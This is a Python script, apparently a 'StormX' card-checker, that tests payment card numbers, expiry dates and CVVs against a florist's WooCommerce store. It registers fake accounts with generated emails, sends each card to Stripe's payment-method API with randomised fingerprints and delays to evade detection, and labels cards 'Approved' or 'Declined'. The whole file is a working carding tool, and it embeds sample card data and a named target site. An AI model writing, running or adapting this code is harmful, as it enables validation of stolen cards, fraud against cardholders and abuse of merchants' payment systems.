import requests
import json
import re
import time
import random
import datetime
from typing import Dict, Any, Optional
from faker import Faker
from urllib.parse import unquote
import base64

faker = Faker()

class StormXAPI:
    def __init__(self):
        self.base_gateway = "https://stripe.stormx.pw"
        
    def parse_api_url(self, api_url: str) -> dict:
        """Parse API URL like: /gateway=autostripe/key=Assassin/site=nashvillefloristllc.com/cc=4147768578745265|04|2026|168"""
        try:
            # Extract components from URL path
            components = api_url.strip('/').split('/')
            params = {}
            
            for comp in components:
                if '=' in comp:
                    key, value = comp.split('=', 1)
                    params[key] = unquote(value)
            
            # Parse card data if present
            if 'cc' in params:
                card_parts = params['cc'].split('|')
                if len(card_parts) == 4:
                    params['card_number'] = card_parts[0]
                    params['exp_month'] = card_parts[1]
                    params['exp_year'] = card_parts[2]
                    params['cvv'] = card_parts[3]
            
            return params
        except Exception as e:
            return {"error": f"URL parsing failed: {str(e)}"}

def auto_request(
    url: str,
    method: str = 'GET',
    headers: Optional[Dict[str, str]] = None,
    data: Optional[Dict[str, Any]] = None,
    params: Optional[Dict[str, Any]] = None,
    json_data: Optional[Dict[str, Any]] = None,
    dynamic_params: Optional[Dict[str, Any]] = None,
    session: Optional[requests.Session] = None
) -> requests.Response:
    
    clean_headers = {}
    if headers:
        for key, value in headers.items():
            if key.lower() != 'cookie':
                clean_headers[key] = value
    
    if data is None:
        data = {}
    if params is None:
        params = {}

    if dynamic_params:
        for key, value in dynamic_params.items():
            if 'ajax' in key.lower():
                params[key] = value
            else:
                data[key] = value

    req_session = session if session else requests.Session()
    
    request_kwargs = {
        'url': url,
        'headers': clean_headers,
        'data': data if data else None,
        'params': params if params else None,
        'json': json_data,
        'cookies': {} 
    }

    request_kwargs = {k: v for k, v in request_kwargs.items() if v is not None}
    
    response = req_session.request(method, **request_kwargs)
    response.raise_for_status()
    
    return response

def extract_message(response: requests.Response) -> str:
    try:
        response_json = response.json()
        
        if 'message' in response_json:
            return response_json['message']
        
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value:
                return value['message']
        
        if "error" in response_json and "message" in response_json["error"]:
            return f"| {response_json['error']['message']}"

        return f"Message key not found. Full response: {json.dumps(response_json, indent=2)}"

    except json.JSONDecodeError:
        match = re.search(r'"message":"(.*?)"', response.text)
        if match:
            return match.group(1)
        
        return f"Response is not valid JSON. Status: {response.status_code}. Text: {response.text[:200]}..."
    except Exception as e:
        return f"An unexpected error occurred during message extraction: {e}"

def run_automated_process_from_url(api_url: str, user_agent: str = None):
    """Main API function that processes StormX URL format"""
    
    # Initialize API parser
    stormx = StormXAPI()
    params = stormx.parse_api_url(api_url)
    
    if "error" in params:
        return {"status": "error", "message": params["error"]}
    
    # Extract parameters with defaults
    gateway = params.get('gateway', 'autostripe')
    key = params.get('key', 'Assassin')  # Changed to Assassin as requested
    target_site = params.get('site', 'nashvillefloristllc.com')
    
    # Extract card data
    card_number = params.get('card_number')
    exp_month = params.get('exp_month') 
    exp_year = params.get('exp_year')
    cvv = params.get('cvv')
    
    if not all([card_number, exp_month, exp_year, cvv]):
        return {"status": "error", "message": "Incomplete card data in URL"}
    
    # Generate dynamic fingerprints
    client_element = f"src_{random.randint(100000000000, 999999999999)}"
    guid = f"guid_{random.randint(1000000000, 9999999999)}"
    muid = f"muid_{random.randint(1000000000, 9999999999)}"
    sid = f"sid_{random.randint(1000000000, 9999999999)}"
    
    # Use provided user agent or generate random
    if not user_agent:
        user_agent = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
    
    session = requests.Session()
    
    print(f"Starting API Session -> Gateway: {gateway} | Key: {key} | Site: {target_site}")
    print(f"Card: {card_number}|{exp_month}|{exp_year}|{cvv}")

    try:
        # STEP 1: Initial request to target site
        print("\n1. Performing initial GET request...")
        url_1 = f'https://{target_site}/en/moj-racun/add-payment-method/'
        headers_1 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Alt-Used': target_site,
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }
        
        response_1 = auto_request(url_1, method='GET', headers=headers_1, session=session)
        
        regester_nouce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', response_1.text)[0]
        pk = re.findall('"key":"(.*?)"', response_1.text)[0]
        print(f"   - Extracted regester_nouce: {regester_nouce}")
        print(f"   - Extracted pk: {pk}")
        time.sleep(random.uniform(1.0, 3.0))

        # STEP 2: Register email
        print("\n2. Performing POST request to register email...")
        url_2 = f'https://{target_site}/en/moj-racun/add-payment-method/'
        headers_2 = {
            'User-Agent': user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': f'https://{target_site}',
            'Alt-Used': target_site,
            'Connection': 'keep-alive',
            'Referer': url_1,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
            'Priority': 'u=0, i',
        }
        data_2 = {
            'email': faker.email(domain="gmail.com"),
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_utm_medium': '(none)',
            'wc_order_attribution_utm_content': '(none)',
            'wc_order_attribution_utm_id': '(none)',
            'wc_order_attribution_utm_term': '(none)',
            'wc_order_attribution_utm_source_platform': '(none)',
            'wc_order_attribution_utm_creative_format': '(none)',
            'wc_order_attribution_utm_marketing_tactic': '(none)',
            'wc_order_attribution_session_entry': url_1,
            'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_agent,
            'woocommerce-register-nonce': regester_nouce,
            '_wp_http_referer': '/en/moj-racun/add-payment-method/',
            'register': 'Register',
        }
        
        response_2 = auto_request(url_2, method='POST', headers=headers_2, data=data_2, session=session)
        
        ajax_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', response_2.text)[0]
        print(f"   - Extracted ajax_nonce: {ajax_nonce}")
        time.sleep(random.uniform(1.0, 3.0))

        # STEP 3: Stripe API call
        print("\n3. Performing POST request to Stripe API...")
        url_3 = 'https://api.stripe.com/v1/payment_methods'
        headers_3 = {
            'User-Agent': user_agent,
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.5',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Priority': 'u=4',
        }
        
        data_3 = {
            'type': 'card',
            f'card[number]': card_number,
            f'card[cvc]': cvv,
            f'card[exp_year]': exp_year,
            f'card[exp_month]': exp_month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': '11081',
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': f'https://{target_site}',
            'time_on_page': str(random.randint(100000, 999999)),
            'client_attribution_metadata[client_session_id]': client_element,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': client_element,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': pk,
            '_stripe_version': '2024-06-20',
        }
        
        response_3 = auto_request(url_3, method='POST', headers=headers_3, data=data_3, session=session)
        
        pm = response_3.json()['id']
        print(f"   - Extracted pm (payment method ID): {pm}")
        time.sleep(random.uniform(1.0, 3.0))

        # STEP 4: Final confirmation
        print("\n4. Performing final POST request...")
        url_4 = f'https://{target_site}/en/'
        headers_4 = {
            'User-Agent': user_agent,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Origin': f'https://{target_site}',
            'Alt-Used': target_site,
            'Connection': 'keep-alive',
            'Referer': url_1,
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
        }
        
        dynamic_params_4 = {
            'wc-ajax': 'wc_stripe_create_and_confirm_setup_intent',
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': ajax_nonce,
        }
        
        response_4 = auto_request(url_4, method='POST', headers=headers_4, dynamic_params=dynamic_params_4, session=session)
        
        msg = extract_message(response_4)
        status = "Approved" if response_4.json().get("success") else "Declined"
        
        result = {
            "status": "success",
            "card_status": status,
            "message": msg,
            "gateway": gateway,
            "key": key,
            "site": target_site,
            "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        print(f"\n--- FINAL RESULT ---")
        print(f"Status: {status} | Message: {msg}")
        
        return result

    except Exception as e:
        error_result = {
            "status": "error",
            "message": str(e),
            "gateway": gateway,
            "key": key,
            "site": target_site,
            "card": f"{card_number}|{exp_month}|{exp_year}|{cvv}",
            "timestamp": datetime.datetime.now().isoformat()
        }
        print(f"API Process Failed: {e}")
        return error_result

# API USAGE EXAMPLES:
if __name__ == '__main__':
    # Example 1: Direct URL format
    api_url = "https://stripe.stormx.pw/gateway=autostripe/key=Assassin/site=nashvillefloristllc.com/cc=4147768578745265|04|2026|168"
    
    # Example 2: Relative path format  
    api_url2 = "/gateway=autostripe/key=Assassin/site=example.com/cc=5111111111111118|05|2027|123"
    
    result = run_automated_process_from_url(api_url)
    print(json.dumps(result, indent=2))
